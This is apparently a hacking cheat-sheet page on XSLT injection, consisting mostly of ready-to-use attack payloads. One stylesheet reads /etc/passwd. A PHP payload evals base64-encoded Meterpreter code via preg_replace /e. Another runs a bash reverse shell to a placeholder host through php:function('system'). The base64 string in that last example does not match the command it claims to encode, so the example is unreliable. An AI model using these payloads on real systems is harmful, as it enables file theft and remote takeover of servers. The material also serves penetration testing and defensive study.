---
description: eXtensible Stylesheet Language Template
---

# XSL/XSLT Injection

> XSL (eXtensible Stylesheet Language) is a styling language for XML.&#x20;
>
> XSLT stands for XSL Transformations.

XSLT is used to transform XML documents in another kind. Versions are: 1, 2 and 3 (1 is the most used). The transformation can be done in the server or in the browser).

In order to exploit this kind of vulnerability you need to be able to store XSL tags in the server side and then access that content.

### Detection

Look for header "Esigate".

### Fingerprint XSLT version

{% code overflow="wrap" %}
```xml
<?xml version="1.0"?> 
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"> 
<xsl:output method="html"/> 
        <xsl:template match="/"> 
                <b>Version:</b><xsl:value-of select="system-property('xsl:version')"/><br/> 
                <b>Vendor:</b><xsl:value-of select="system-property('xsl:vendor')"/><br/> 
                <b>Vendor URL:</b><xsl:value-of select="system-property('xsl:vendor-url')"/><br/> 
        </xsl:template> 
</xsl:stylesheet> 
```
{% endcode %}

Based on the results, read the doc and exploit functionalities for the specific version:

* [https://www.w3.org/TR/xslt-10/](https://www.w3.org/TR/xslt-10/)&#x20;
* [https://www.w3.org/TR/xslt20/](https://www.w3.org/TR/xslt20/)&#x20;
* [https://www.w3.org/TR/xslt-30/](https://www.w3.org/TR/xslt-30/)&#x20;

### Read local files

{% code overflow="wrap" %}
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0"> 
<xsl:template match="/"> 
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/> 
</xsl:template> 
</xsl:stylesheet> 
```
{% endcode %}

### RCE (php)

#### Method 1:

{% code overflow="wrap" %}
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0"> 
<xsl:template match="/"> 
<xsl:variable name="eval"> 
eval(base64_decode('Base64-encoded Meterpreter code')) 
</xsl:variable> 
<xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/> 
</xsl:template> 
</xsl:stylesheet> 
```
{% endcode %}

#### Method 2:

{% code overflow="wrap" %}
```bash
#1. Base64 encode our reverse shell: 
echo "/bin/bash -c 'bash -i>& /dev/tcp/x.x.x.x/1234 0>&1'" | base64 -w0 

#2. Inject in XSL 
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" 
version="1.0"> 
<!-- We add the PHP's xmlns --> 
    <xsl:template match="/"> 
        <html> 
              <xsl:value-of select="php:function('system','echo U0MzIxIDA+JjEnCg==|base64 -d|bash')" /> 
        </html> 
    </xsl:template> 
</xsl:stylesheet> 
```
{% endcode %}
